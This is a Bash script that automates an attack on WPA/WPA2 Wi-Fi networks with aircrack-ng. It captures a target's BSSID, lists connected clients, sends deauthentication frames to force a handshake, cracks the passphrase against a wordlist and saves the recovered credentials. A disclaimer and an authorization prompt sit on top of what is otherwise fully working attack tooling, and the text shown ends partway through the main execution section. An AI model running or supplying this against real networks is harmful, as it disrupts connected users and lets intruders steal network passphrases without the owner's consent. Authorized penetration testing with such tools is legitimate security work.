#!/bin/bash

###################################################################################################
#################################### VARIABLES ####################################################
###################################################################################################

HANDSHAKE_FILE="captured_handshake/handshake_capture-01.cap"
TERMINATED_BY_USER=0
SAVE_HANDSHAKE=0
AIRCRACK_PID=0
CMDLINE_HANDSHAKE=0
INTERRUPTED_DURING_SAVE_PROMPT=0
IN_CRACK_HANDSHAKE_FUNCTION=0
HANDSHAKE_CAPTURED=0
SECOND_PROMPT_STATE=0
CREDENTIALS_SAVED_DECISION_MADE=0
INVALID_ARG=0
DO_CLEANUP=1
INTERRUPTED=0

####################################################################################################
################################### COLORS #########################################################
####################################################################################################

# Define ANSI escape codes for green colors
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# Define ANSI escape codes for blue colors
BLUE='\033[0;34m'
BOLD_BLUE='\033[1;34m'
NC='\033[0m' # No Color

# Define ANSI escape codes for red colors
BOLD_RED='\033[1;31m'
NC='\033[0m' # No Color

# Define ANSI escape codes for yellow colors
YELLOW='\033[0;33m'
BOLD_YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Define ANSI escape codes for orange colors
ORANGE='\033[38;5;208m'
NC='\033[0m' # No Color

# Define ANSI escape codes for magenta colors
MAGENTA='\033[35m'
BOLD_MAGENTA='\033[95m'
NC='\033[0m' # No Color

####################################################################################################
###################################### DISCLAIMER ##################################################
####################################################################################################

echo ""
echo -e "${BOLD_RED}DISCLAIMER:${NC}"
echo ""
echo -e "${BOLD_RED}This script is intended solely for ethical penetration testing and security research purposes.
By using this script, you agree to comply with all applicable local, state, national, and international laws and regulations regarding cybersecurity and data protection.
You must obtain explicit permission to perform penetration testing on any network.
The developer of this script assumes no liability for damages or legal consequences incurred by improper or illegal use.
This script is provided 'as is' without warranty of any kind. Your use of this script constitutes your agreement to these terms and conditions.${NC}"

echo ""

####################################################################################################
######################################### CLEANUP ##################################################
####################################################################################################


cleanup() {
    # Always end monitor mode
    echo ""
    MON_INTERFACE=$(iw dev | grep -A 1 "$INTERFACE" | grep -Eo 'Interface \S+' | cut -d ' ' -f 2)
    echo ""
    echo -e "${BOLD_BLUE}Switching $MON_INTERFACE back to managed mode.${NC}"
    echo ""
    airmon-ng stop $MON_INTERFACE &> /dev/null

    # Always delete these files
    rm -f captured_handshake/airodump_output.txt
    rm -f caputred_handshake/airodump_output.csv*
    rm -f captured_handshake/airodump_output.csv-01.csv
    rm -f captured_handshake/aircrack_output.txt
    rm -f captured_handshake/cleaned_output.txt
    rm -f captured_handshake/output-01.csv
    rm -f captured_handshake/handshake_capture-01.csv
    rm -f captured_handshake/handshake_capture-01.kismet.csv
    rm -f captured_handshake/handshake_capture-01.kismet.netxml
    rm -f captured_handshake/handshake_capture-01.log.csv

    # Conditionally delete the handshake file
    if [ "$DO_CLEANUP" -eq 1 ]; then
        if [ "$CMDLINE_HANDSHAKE" -eq 0 ] && { [ -z "$KEY" ] || [ "$KEY" == "PLACEHOLDER" ]; }; then
            rm -f captured_handshake/* > /dev/null 2>&1
        fi
    fi
}


####################################################################################################
####################################### ERROR EXIT #################################################
####################################################################################################

error_exit() {
    echo "Error: $1" >&2
    cleanup
    exit 1
}

####################################################################################################
#################################### PRE-REQUISITE CHECKS ##########################################
####################################################################################################

pre_requisite_checks(){
# Checking if script is being run as root
if [[ $EUID -ne 0 ]]; then
   error_exit "This script must be run as root"
   exit 1
fi

# Verifying that necessary commands are installed
for cmd in iwconfig grep cut aircrack-ng sed iw; do
    if ! command -v $cmd &> /dev/null; then
        error_exit "$cmd could not be found, please install it."
    fi
done

# Detecting all the wireless interfaces
INTERFACES=$(iw dev | awk '/Interface/ {print $2}')

# Count the number of interfaces
INTERFACE_COUNT=$(echo "$INTERFACES" | wc -l)

if [ "$INTERFACE_COUNT" -lt 1 ]; then
    error_exit "At least 1 wireless interface is required but none were found."
fi
}


####################################################################################################
##################################### GET BSSID ####################################################
####################################################################################################

get_bssid(){

    # Prompt the user to enter the SSID
    echo ""
    while true; do
        echo -e "${GREEN}Enter the target SSID: ${NC}"
        read -r TARGET_SSID

        if [[ -z "$TARGET_SSID" ]]; then
            echo "SSID cannot be empty. Please enter a valid SSID."
            echo ""
        else
            echo -e "${BOLD_RED}Confirm target: ${GREEN}$TARGET_SSID${BOLD_RED} ? (Y/N)${NC}"
            read -r ANSWER
            case "$ANSWER" in
                [Yy]* )
                    break
                    ;;
                [Nn]* )
                    echo "Please re-enter the target SSID"
                    continue
                    ;;
                *)
                    echo "Invalid input. Please enter Y/Yes or N/No"
                    ;;
            esac
        fi
    done

    # Define the file name for the airodump-ng output
    output_file="airodump_output.csv"

    # Start airodump-ng to capture frames and output to a file
    airodump-ng $MON_INTERFACE --write captured_handshake/$output_file --output-format csv > /dev/null 2>&1 &

    # Get the process ID of airodump-ng so we can kill it later
    airodump_pid=$!

    # Let airodump-ng run for a sufficient time to capture datai
    echo -e "Attempting to capture BSSID and Channel for:${GREEN} '$TARGET_SSID' ${NC}"
    sleep 30

    # Kill the airodump-ng process
    kill $airodump_pid

    # Wait a bit to ensure the process has terminated and the file is written
    sleep 5

    # Search for the SSID in the output file and extract the corresponding BSSID and Channel
    BSSID=$(grep -a "$TARGET_SSID" "captured_handshake/$output_file"-01.csv | awk -F, '{print $1}' | xargs)
    CHANNEL=$(grep -a "$TARGET_SSID" "captured_handshake/$output_file"-01.csv | awk -F, '{print $4}' | xargs)

    # Check if a BSSID was found
    if [ -n "$BSSID" ]; then
        echo -e "${YELLOW}BSSID and Channel Successfully Captured!${NC}"
        echo -e "BSSID for $TARGET_SSID: ${GREEN} $BSSID ${NC}"
        echo -e "Channel for $TARGET_SSID: ${GREEN} $CHANNEL ${NC}"
        echo ""

        while true; do
            # Clear the input buffer
            while read -r -t 0; do read -r; done
            # First Confirmation Prompt
            echo -e "${BOLD_RED}Have you received authorization to test ${GREEN}$TARGET_SSID ($BSSID)${BOLD_RED}, and would you like to proceed with a deauthentication attack and monitor its network traffic? (yes/no)${NC}"
            read USER_ANSWER

            case "$USER_ANSWER" in
                [Yy]|[Yy][Ee][Ss])
                    break  # Exit the inner loop
                    ;;
                [Nn]|[Nn][Oo])
                    echo "Exiting the script due to user cancellation"
                    exit 1
                    ;;
                *)
                    echo "Please enter a valid response."
                    ;;
            esac
            done
    else
        echo -e "${BOLD_RED}No BSSID found for SSID: '$TARGET_SSID'${NC}"
        echo "Exiting"
        exit 1
    fi
    }

####################################################################################################
############################### SAVE CREDENTIALS ###################################################
####################################################################################################

save_credentials() {
    while true; do
        if [ $INTERRUPTED -eq 1 ]; then
            INTERRUPTED=0
            continue  # This sends us back to the top of the while loop.
        fi

        read -p "Save the network credentials? (Y/N) " SAVE_CHOICE
        case "$SAVE_CHOICE" in
            [Yy]* )
                read -p "Would you like to save the network credentials file as \"$TARGET_SSID\"? (Y/N) " SAVE_CHOICE_DEFAULT
                case "$SAVE_CHOICE_DEFAULT" in
                    [Yy]* )
                        CREDENTIALS_FILENAME="$TARGET_SSID.txt"
                        echo "SSID: $TARGET_SSID" > "saved_credentials/$CREDENTIALS_FILENAME"
                        echo "BSSID: $BSSID" >> "saved_credentials/$CREDENTIALS_FILENAME"
                        echo "Passphrase: $KEY" >> "saved_credentials/$CREDENTIALS_FILENAME"
                        echo -e "${YELLOW}Credentials file saved in ~/wifi_attack/saved_credentials/'$CREDENTIALS_FILENAME'${NC}"
                        cmd_line_check
                        return  # return from the save_credentials function
                        ;;
                    [Nn]* )
                        read -p "Please specify the file name for the $TARGET_SSID network credentials file: " CREDENTIALS_FILENAME || continue
                        if [ -n "$CREDENTIALS_FILENAME" ]; then
                            CREDENTIALS_FILENAME="${CREDENTIALS_FILENAME}.txt"
                            echo "SSID: $TARGET_SSID" > "saved_credentials/$CREDENTIALS_FILENAME"
                            echo "BSSID: $BSSID" >> "saved_credentials/$CREDENTIALS_FILENAME"
                            echo "Passphrase: $KEY" >> "saved_credentials/$CREDENTIALS_FILENAME"
                            echo -e "${YELLOW}Credentials file saved in ~/wifi_attack/saved_credentials/'$CREDENTIALS_FILENAME'${NC}"
                            cmd_line_check
                            return  # return from the save_credentials function
                        else
                            echo "Please enter a valid filename."
                        fi
                        ;;
                    *)
                        echo "Invalid input. Please enter Y/Yes or N/No"
                        ;;
                esac
                ;;
            [Nn]* )
                echo -e "${BOLD_RED}Network credentials will not be saved.${NC}"
                cmd_line_check
                return
                ;;
            *)
                echo "Invalid input. Please enter Y/Yes or N/No"
                ;;
        esac
    done
}

cmd_line_check() {
# Check the value of CMDLINE_HANDSHAKE
if [ $CMDLINE_HANDSHAKE -eq 0 ]; then
    rm -f captured_handshake/* > /dev/null 2>&1
    exit 0  # Exit the script after cleanup
else
    # Add code here to delete another set of files when CMDLINE_HANDSHAKE is equal to 1
    rm -f "captured_handshake/saved_handshake/$HANDSHAKE_NAME"
    rm -f "captured_handshake/saved_handshake/$HANDSHAKE_NAME.ssid"
    rm -f "captured_handshake/saved_handshake/$HANDSHAKE_NAME.bssid"
    exit 0
fi
}

####################################################################################################
############################### HANDLE INTERRUPT FUNCTION ##########################################
####################################################################################################

handle_interrupt() {
    INTERRUPTED=1  # Set this immediately to indicate interruption

    if [ $AIRCRACK_PID -ne 0 ]; then
        kill $AIRCRACK_PID 2>/dev/null
    fi

    if [ "$IN_CRACK_HANDSHAKE_FUNCTION" -eq 1 ]; then
        echo -e "\nYou interrupted during the save prompt."
        save_credentials
    else
        echo -e "\nScript interrupted by user."
        if [ "${DELETE_ON_INTERRUPT:-0}" -eq 1 ]; then
            rm -f captured_handshake/* > /dev/null 2>&1
        fi
        exit 1
    fi
}

trap cleanup EXIT
trap handle_interrupt SIGINT

####################################################################################################
################################### CHECK FOR WORDLIST #############################################
####################################################################################################

check_for_wordlist() {
while true; do
    # Save the BSSID and SSID values
    echo $BSSID > captured_handshake/bssid
    echo $TARGET_SSID > captured_handshake/ssid
    # Prompt user for wordlist name
    echo ""
    echo -e "${MAGENTA}Enter a wordlist for cracking the pre-shared key.${NC}"
    echo "(Note: Wordlists files are run from ~/wifi_attack/wordlists)"
    echo ""
    read -p "Name of wordlist: " WORDLIST

    # If user-inputted wordlist exists in ~/wifi_attack/wordlists/ then break out of the loop.
    if [ -f "wordlists/$WORDLIST" ]; then
        echo -e "${MAGENTA}$WORDLIST found in ~/wifi_attack/wordlists${NC}"
        WORDLIST_FILE=wordlists/$WORDLIST
        break
    else
        echo ""
        echo -e "Wordlist: ${MAGENTA}($WORDLIST)${NC} was ${BOLD_RED}not found${NC} in ~/wifi_attack/wordlists/"
        # User-entered wordlist DOES NOT EXIST in ~/wifi_attack/wordlists/
        # Check for rockyou.txt in the ~/wifi_attack/wordlists/directory
            if [ -f "wordlists/rockyou.txt" ]; then
            while true; do
                read -p "rockyou.txt was found in the wordlists directory. Would you like to use it as the wordlist? (Y/N): " ROCKYOU_CURRENT_CHOICE
                case $ROCKYOU_CURRENT_CHOICE in
                    [Yy]* )
                        WORDLIST_FILE="wordlists/rockyou.txt"
                        echo -e "${MAGENTA}Using $WORDLIST_FILE as a wordlist.${NC}"
                        break 2 # Breaking out of both while loops
                        ;;
                    [Nn]* )
                        break # Just break out of this inner loop
                        ;;
                    * )
                        echo "Invalid input. Please answer with Y or N."
                esac
            done
        fi
        #############################################################################################
        ################## ROCKYOU.TXT WAS NOT FOUND IN THE ./WORDLISTS/ DIRECTORY ##################
        #############################################################################################
        # If rockyou.txt was not found in the wordlists directory, then check in /usr/share/wordlists/
        if [ ! -f "wordlists/rockyou.txt" ]; then
            while true; do
                echo -e "${BOLD_RED}Checking for rockyou.txt in ~/wifi_attack/wordlists/${NC}"
                echo -e "rockyou.txt was ${BOLD_RED}not found${NC} in ~/wifi_attack/wordlists/"

        #############################################################################################
        ################## SEARCHING FOR ROCKYOU.TXT IN /USR/SHARE/WORDLISTS ########################
        #############################################################################################
                echo -e "${MAGENTA}Would you like to use rockyou.txt from /usr/share/wordlists/ as a wordlist? (Y/N):${NC} "
                read ROCKYOU_SHARE_CHOICE
                case $ROCKYOU_SHARE_CHOICE in
                    [Yy]* )
                        if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
                            echo ""
                            # rockyou.txt found unzipped in /usr/share/wordlists/
                            echo -e "${MAGENTA}rockyou.txt was found already unzipped in /usr/share/wordlists and is being copied to ~/wifi_attack/wordlists/ ${NC}"
                            # Copying rockyou.txt from /usr/share/wordlists to ~/wifi_attack/wordlists/
                            cp /usr/share/wordlists/rockyou.txt wordlists
                            WORDLIST_FILE="wordlists/rockyou.txt"

                            break 2 # Breaking out of both while loops

                        # rockyou.txt found unzipped in /usr/share/wordlists
                        elif [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
                            echo ""
                            echo -e "${MAGENTA}rockyou.txt.gz was found in /usr/share/wordlists/${NC}"
                            # Copy the zipped rockyou.txt file to the ./wordlists directory and unzip it
                            echo "${MAGENTA}Copying rockyou.txt.gz to the ~/wifi_attack/wordlists/ directory and unzipping it/${NC}"
                            cp /usr/share/wordlists/rockyou.txt.gz wordlists
                            gunzip wordlists/rockyou.txt.gz
                            WORDLIST_FILE="wordlists/rockyou.txt"

                            break 2
                        else
                            echo -e "${BOLD_RED}rockyou.txt was not found in /usr/share/wordlists/ and a wordlist is needed.${NC}"

                            break # Break out of this inner loop and continue to the main prompt
                        fi
                        ;;
                    [Nn]* )
                        break # Just break out of this inner loop
                        ;;
                    * )
                        echo "Invalid input. Please answer with Y or N."
                esac
            done
        fi
    fi

done

}


####################################################################################################
############################# SET INTERFACE IN MONITOR MODE ########################################
####################################################################################################


set_interface_in_monitor_mode(){


# User Advisory
echo "⚠️WARNING: If you choose to monitor on the wireless interface currently used for your internet connection you will lose internet access.
Ensure you have an alternative internet connection (such as a wired ethernet connection or a separate wireless interface) before proceeding.
To restore your internet connection, you may need to restart your machine after using the script."
echo ""

# Display the available wireless interfaces
echo -e "${BOLD_BLUE}Available wireless interfaces:${NC} "
echo -e "${BOLD_BLUE}$INTERFACES${NC}"
echo ""

while true; do
    # Prompt the user to choose a wireless interface
    echo -e "${BOLD_BLUE}Enter the wireless interface that will be used for the wireless network hacking:${NC} "
    read -r INTERFACE

    # Check if the input is empty
    if [ -z "$INTERFACE" ]; then
        echo "No interface entered. Please enter a valid interface."
        echo ""
        continue
    fi

    # Validate that the chosen interface is in the list
    if [[ $INTERFACES == *"$INTERFACE"* ]]; then
        # Attempt to set the wireless interface into monitor mode
        if airmon-ng start "$INTERFACE" &> /dev/null; then
            MON_INTERFACE=$(iw dev | grep -A 1 "$INTERFACE" | grep -Eo 'Interface \S+' | cut -d ' ' -f 2)
            if [[ -z "$MON_INTERFACE" ]]; then
                echo "FAILED TO RETRIEVE MONITOR MODE INTERFACE"
                continue
            fi
            echo -e "${BOLD_BLUE}$INTERFACE${NC} has entered monitor mode."
            break
        else
            echo ""
            echo -e "${BOLD_RED}INVALID INTERFACE SELECTED: ($INTERFACE). Please choose a valid interface from the list. ${NC}"
        fi
    else
        echo ""
        echo -e "${BOLD_RED}INVALID INTERFACE SELECTED: ($INTERFACE). Please choose a valid interface from the list.${NC}"
    fi
done

}

####################################################################################################
########################### CREATING NECESSARY DIRECTORIES #########################################
####################################################################################################

creating_directories(){

mkdir wifi_attack > /dev/null 2<&1
cd /home/"$SUDO_USER"
cd wifi_attack

[ -d "wordlists" ] || mkdir wordlists
[ -d "captured_handshake" ] || mkdir captured_handshake
[ -d "captured_handshake/saved_handshake" ] || mkdir captured_handshake/saved_handshake
[ -d "saved_credentials" ] || mkdir saved_credentials

}


####################################################################################################
############################## LISTEN FOR WPA HANDSHAKE ############################################
####################################################################################################

listen_for_wpa_handshake() {
    # Set the wireless interface to the channel of the AP
    airmon-ng start $MON_INTERFACE $CHANNEL &> /dev/null
    
    # Start capturing frames without displaying output
    airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w captured_handshake/handshake_capture "$MON_INTERFACE" &> captured_handshake/airodump_output.txt &
    if [[ $? -ne 0 ]]; then
        echo -e "${BOLD_RED}This command failed to detect frames for the network BSSID ($BSSID):${NC} sudo airodump-ng -c $CHANNEL --bssid $BSSID -w captured_handshake/handshake_capture $MON_INTERFACE"
        error_exit "This command failed to detect the network BSSID ($BSSID)"
    fi
    echo ""
    echo -e "${BOLD_RED}Attempting to monitor network traffic on: ${GREEN}$TARGET_SSID ($BSSID)${NC}"
    AIRODUMP_PID=$!

    # Wait for a short time to allow initial frame capture
    sleep 10

    # Check for the presence of the router's BSSID
    for i in {1..6}; do
        if grep -qE "$BSSID" captured_handshake/airodump_output.txt; then
            echo -e "Successfully capturing network traffic on BSSID: ${GREEN}$TARGET_SSID ($BSSID)${NC}"
            break
        elif [ $i -eq 6 ]; then
            echo -e "${BOLD_RED}Failed to monitor network traffic on $TARGET_SSID ($BSSID).${NC}"
            echo -e "${BOLD_RED}This command failed to detect connected devices:${NC} sudo airodump-ng -c $CHANNEL --bssid $BSSID -w captured_handshake/handshake_capture $MON_INTERFACE"
            exit 1
        fi
        sleep 10
    done

    DELETE_ON_INTERRUPT=1
    handshake_captured=false

    # Enumerate Mac Addresses
    echo ""
    echo -e "${BOLD_RED}Enumerating Clients on ${GREEN}$TARGET_SSID ($BSSID)${NC}"
    detected_mac=$(grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' captured_handshake/airodump_output.txt | grep -vE "^$BSSID$" | head -n 1)
    detected_mac1=$(grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' captured_handshake/airodump_output.txt | grep -vE "^$BSSID$" | grep -vE "^$detected_mac$" | head -n 1)
    detected_mac2=$(grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' captured_handshake/airodump_output.txt | grep -vE "^$BSSID$" | grep -vE "^$detected_mac$" | grep -vE "^$detected_mac1$" | head -n 1)
    detected_mac3=$(grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' captured_handshake/airodump_output.txt | grep -vE "^$BSSID$" | grep -vE "^$detected_mac$" | grep -vE "^$detected_mac1$" | grep -vE "^$detected_mac2$" | head -n 1)
    detected_mac4=$(grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' captured_handshake/airodump_output.txt | grep -vE "^$BSSID$" | grep -vE "^$detected_mac$" | grep -vE "^$detected_mac1$" | grep -vE "^$detected_mac2$" | grep -vE "^$detected_mac3$" | head -n 1)

    # Repeat this loop if the handshake capture is unsuccessful
    while [[ $handshake_captured == false ]]; do
    echo -e "1) ${GREEN}Router: ${TARGET_SSID} ($BSSID)${NC}"
    mac_addresses=("$BSSID" "$detected_mac" "$detected_mac1" "$detected_mac2" "$detected_mac3" "$detected_mac4")
    for (( i = 1; i < ${#mac_addresses[@]}; i++ )); do
        if [[ -n "${mac_addresses[i]}" ]]; then
            echo -e "$((i+1))) ${ORANGE}MAC Address: ${mac_addresses[i]}${NC}"
        fi
    done

    # Prompting User to Identify Target of Attack
    while true; do
        echo -n "Enter the index number that corresponds to the intended target: "
        read USER_CHOICE

    # Adjusted the regular expression to ensure USER_CHOICE is a number within the valid range
        if [[ "$USER_CHOICE" =~ ^[1-$((${#mac_addresses[@]}))]$ ]]; then
            CONNECTED_CLIENT=$((USER_CHOICE-1))
            selected_mac="${mac_addresses[$CONNECTED_CLIENT]}"

        # Check if selected_mac is not empty
            if [ -n "$selected_mac" ]; then
                break
            else
                echo "Invalid input. Please enter a valid option."
            fi
        elif [[ "$USER_CHOICE" == "abort" ]]; then
            echo "Deauth. attack aborted by user."
            exit 0
        else
            echo "Invalid input. Please enter a valid option."
        fi
    done

        # Perform deauthentication based on user choice
        if [ "$selected_mac" == "$BSSID" ]; then
            echo ""
            echo -e "Sent a single deauthentication frame to ${GREEN}$TARGET_SSID ($BSSID)${NC}"
            aireplay-ng --deauth 1 -a "$BSSID" "$MON_INTERFACE" &> /dev/null
        else
            echo ""
            echo -e "Sent a single deauthentication frame to ${ORANGE}client ($selected_mac)${NC}"
            aireplay-ng --deauth 1 -a "$BSSID" -c "$selected_mac" "$MON_INTERFACE" &> /dev/null
        fi

        # Check for handshake
        sleep 30
        if grep -q "WPA handshake" captured_handshake/airodump_output.txt; then
            echo -e "${YELLOW}WPA handshake captured.${NC}"
            DELETE_ON_INTERRUPT=0
            handshake_captured=true
        else
            echo -e "${BOLD_RED}Handshake not captured.${NC}"

            # Perform deauthentication (x5) based on user choice
            if [ "$selected_mac" == "$BSSID" ]; then
                echo ""
                echo -e "Sending 5 deauthentication frames to ${GREEN}$TARGET_SSID ($BSSID)${NC}"
                aireplay-ng --deauth 5 -a "$BSSID" "$MON_INTERFACE" &> /dev/null
            else
                echo ""
                echo -e "Sending 5 deauthentication frames to ${ORANGE}client ($selected_mac)${NC}"
                aireplay-ng --deauth 5 -a "$BSSID" -c "$selected_mac" "$MON_INTERFACE" &> /dev/null
            fi
                sleep 30
                # Notify user that WPA handshake has been successfully captured, or loop back to target selection if it has not
                if grep -q "WPA handshake" captured_handshake/airodump_output.txt; then
                    echo -e "${YELLOW}WPA handshake captured.${NC}"
                    DELETE_ON_INTERRUPT=0
                    handshake_captured=true
                else
                    echo -e "${BOLD_RED}No handshake was captured through deauthentication of target. Returning to target selection.${NC}"
                    continue # Loop back to the start of enumeration
                fi
            fi
        done

        pkill -P $AIRODUMP_PID
}

####################################################################################################
#################################### PSK CRACKING ##################################################
####################################################################################################

crack_psk_and_process_output() {
    DO_CLEANUP=0
    SAVE_HANDSHAKE=1
    # Saving the BSSID and SSID for retry of PSK cracking
    echo $BSSID > captured_handshake/bssid
    echo $TARGET_SSID > captured_handshake/ssid
    echo ""
    echo -e ${YELLOW}Cracking the PSK!${NC}
    aircrack-ng -a2 -b "$BSSID" -w "$WORDLIST_FILE" "$HANDSHAKE_FILE" &> captured_handshake/aircrack_output.txt &
    AIRCRACK_PID=$!
    wait $AIRCRACK_PID
    AIRCRACK_PID=0

    sed 's/\x1B\[[0-9;]*[a-zA-Z]//g' captured_handshake/aircrack_output.txt > captured_handshake/cleaned_output.txt

    # Check for missing EAPOL data
    if grep -q "Packets contained no EAPOL data" captured_handshake/cleaned_output.txt; then
        printf "The capture file does not contain a valid WPA handshake. Please capture the handshake again."
        SAVE_HANDSHAKE=0
        exit 1
    fi

    KEY=$(grep "KEY FOUND" captured_handshake/cleaned_output.txt | head -n 1 | cut -d '[' -f 2 | cut -d ']' -f 1)
    if [ -n "$KEY" ]; then
        IN_CRACK_HANDSHAKE_FUNCTION=1
    fi

    if [ -z "$KEY" ]; then
        # Alerting the user that aircrack-ng failed to crack the pre-shared key
        echo -e "${BOLD_RED}The passphrase was not found in the wordlist. Try another wordlist. ${NC}"
        SAVE_HANDSHAKE=1
        DO_CLEANUP=0
        echo ""
        exit 0
    else
        # Alerting user of the successful cracking of the pre-shared key
        echo -e "${YELLOW}Key Found:${NC} $KEY"
        echo ""
        if [ "$CMDLINE_HANDSHAKE" -eq 0 ]; then
            DO_CLEANUP=1
            SAVE_HANDSHAKE=0
        fi
        save_credentials
    fi
    IN_CRACK_HANDSHAKE_FUNCTION=0
}

####################################################################################################
############################# CAPTURE NEW HANDSHAKE ################################################
####################################################################################################

capture_new_handshake(){
text="${GREEN}Starting over${NC}."
echo ""
echo -e "$text"
set_interface_in_monitor_mode
get_bssid
listen_for_wpa_handshake
check_for_wordlist
crack_psk_and_process_output
airmon-ng stop $MON_INTERFACE &> /dev/null
}

####################################################################################################
############################# ASK TO CAPTURE NEW HANDSHAKE #########################################
####################################################################################################

ask_to_capture_new_handshake() {
    while true; do
        echo ""
        echo -e "${BOLD_RED}Would you like to capture a new WPA handshake? (Y/N)${NC} "
        read -r CAPTURE_RESPONSE
        case "$CAPTURE_RESPONSE" in
            [yY][eE][sS]|[yY])
                capture_new_handshake
                break
                ;;
            [nN]|[nN][oO])
                echo "Exiting."
                exit 0
                ;;
            *)
                echo "Invalid input. Please enter Y/Yes or N/No."
                ;;
        esac
    done
}


####################################################################################################
############################# CHECK FOR EXISTING HANDSHAKE #########################################
####################################################################################################
check_for_existing_handshake() {
    if [ -f "captured_handshake/handshake_capture-01.cap" ]; then
        echo -e "${BLUE}Stored Handshake Detected!${NC}"
        echo ""
        BSSID=$(cat captured_handshake/bssid)
        TARGET_SSID=$(cat captured_handshake/ssid)
        MON_INTERFACE=$(iw dev | grep -A 1 "$INTERFACE" | grep -Eo 'Interface \S+' | cut -d ' ' -f 2)

        # Attempt to get the SSID using iw dev
        SAVE_HANDSHAKE=1
        DO_CLEANUP=0
        while true; do
            echo ""
            printf "You've already captured a WPA handshake for $TARGET_SSID ($BSSID)! Would you like to proceed to cracking the WPA2 pre-shared key? (Y/N) "
            read -r RESPONSE
            case "$RESPONSE" in
                [yY][eE][sS]|[yY])
                    SAVE_HANDSHAKE=1
                    DO_CLEANUP=0
                    # Prompt to enter the wordlist
                    check_for_wordlist
                    crack_psk_and_process_output
                    exit 0
                    ;;
                [nN]|[nN][oO])
                    while true; do
                        printf "Would you like to save the handshake file, or delete it? (save/del) "
                        read -r HANDSHAKE_CHOICE
                        case "$HANDSHAKE_CHOICE" in
                            save)
                                read -p "Would you like to save the handshake file as $TARGET_SSID? (Y/N) " HANDSHAKE_SAVE_CHOICE
                                case "$HANDSHAKE_SAVE_CHOICE" in
                                    [Yy]* )
                                        mv captured_handshake/handshake_capture-01.cap "captured_handshake/saved_handshake/$TARGET_SSID"
                                        mv captured_handshake/bssid "captured_handshake/saved_handshake/$TARGET_SSID.bssid"
                                        mv captured_handshake/ssid "captured_handshake/saved_handshake/$TARGET_SSID.ssid"
                                        echo -e "${YELLOW}Handshake saved in ~/wifi_attack/captured_handsake/saved_handshake/'$TARGET_SSID'${NC}"
                                        echo "To show saved handshakes: sudo bash <script> handshakes"
                                        DO_CLEANUP=1
                                        ask_to_capture_new_handshake
                                        ;;
                                    [Nn]* )
                                        read -p "Please specify the file name for the $TARGET_SSID handshake file: " NEW_FILENAME
                                        mv captured_handshake/handshake_capture-01.cap "captured_handshake/saved_handshake/$NEW_FILENAME"
                                        mv captured_handshake/bssid "captured_handshake/saved_handshake/$NEW_FILENAME.bssid"
                                        mv captured_handshake/ssid "captured_handshake/saved_handshake/$NEW_FILENAME.ssid"
                                        rm -f captured_handshake/handshake_capture-01.csv captured_handshake/handshake_capture-01.kismet.netxml captured_handshake/handshake_capture-01.kismet.csv captured_handshake/handshake_capture-01.log.csv
                                        echo "Handshake saved in ~/wifi_attack/captured_handshake/'$NEW_FILENAME'"
                                        echo "To show saved handshakes: sudo bash <script name> handshakes"
                                        DO_CLEANUP=1
                                        ask_to_capture_new_handshake
                                        ;;
                                esac
                                ;;
                            del)
                                rm -f captured_handshake/* > /dev/null 2>&1
                                echo "Handshake file deleted."
                                ask_to_capture_new_handshake
                                ;;
                            *)
                                echo "Invalid input. Please enter 'save' or 'del'."
                                ;;
                        esac
                    done
                    ;;
                *)
                    echo "Invalid input. Please enter Y/Yes or N/No."
                    ;;
            esac
        done
    fi
}


####################################################################################################
########################### PROCESS COMMAND LINE ARGUMENTS #########################################
####################################################################################################

if [ "$#" -eq 0 ]; then
    :
elif [ "$1" == "--help" ]; then
    # Display help information
    echo "Usage:"
    echo "sudo bash <script name> handshakes"
    echo "     # Show saved handshakes (in ~/wifi_attack/captured_handshake/saved_handshake)"
    echo "     # Note: Directories will not exist until the script is started successfully."
    echo ""
    echo "sudo bash <script name> <handshake file name>"
    echo "     # Starts aircrack-ng using saved handshake"
    echo ""
    echo "Help:"
    echo "Temporary handshake files are stored in ~/wifi_attack/captured_handshake."
    echo "Wordlist files are stroed in ~/wifi_attack/wordlists/"
    echo "Saved credentials are stored in ~/wifi_attack/saved_credentials."
    exit 0
elif [ "$1" == "handshakes" ]; then
    # List the handshakes in the 'captured_handshake' directory
    echo ""
    echo "Saved Handshakes:"
    ls ./wifi_attack/captured_handshake/saved_handshake
    echo ""
    echo "To reattempt a handshake: sudo bash <script name> <handshake file name>"
    DO_CLEANUP=0
    exit 0
elif [ -f "./wifi_attack/captured_handshake/saved_handshake/$1" ]; then
    # Change to the wifi_attack directory
    cd wifi_attack
    # Handle valid handshake file
    HANDSHAKE_NAME="$1"
    CMDLINE_HANDSHAKE=1
    HANDSHAKE_FILE="captured_handshake/saved_handshake/$HANDSHAKE_NAME"
    MON_INTERFACE=$(iw dev | grep -A 1 "$INTERFACE" | grep -Eo 'Interface \S+' | cut -d ' ' -f 2)

    # Extract BSSID and SSID filenames based on handshake filename
    BSSID_FILE="$HANDSHAKE_FILE.bssid"
    SSID_FILE="$HANDSHAKE_FILE.ssid"

    # Read BSSID and SSID from their respective files
    BSSID=$(cat "$BSSID_FILE")
    TARGET_SSID=$(cat "$SSID_FILE")

    echo -e "${ORANGE}Saved handshake mode${NC}."

    # Prompt to input the wordlist
    check_for_wordlist

    # Aircrack-ng PSK crack
    crack_psk_and_process_output "$HANDSHAKE_FILE" true
    exit 0
else
    # Handle invalid argument
    echo "Invalid argument. Please specify either 'handshakes' or provide a handshake file name."
    echo ""
    echo "Usage:"
    echo "sudo bash <script name> handshakes"
    echo "     # Displays saved handshakes (in ~/wifi_attack/captured_handshake/saved_handshake)"
    echo "     # Note: Directories will not exist until the script is started successfully."
    echo ""
    echo "sudo bash <script name> <handshake file name>"
    echo "     # Starts aircrack-ng using saved handshake"
    INVALID_ARG=1
fi

if [ "$INVALID_ARG" -eq 1 ]; then
    trap - EXIT  # Remove the exit trap which calls cleanup
    exit 1
fi

####################################################################################################
################################## FUNCTION EXECUTION ##############################################
####################################################################################################

# Pre requisite checks
pre_requisite_checks

# Creating necessary directories
creating_directories

# Check for existing handshake
check_for_existing_handshake

# Set Interface in monitor mode
set_interface_in_monitor_mode

# Get-bssid
get_bssid

# Listen for the WPA handshake
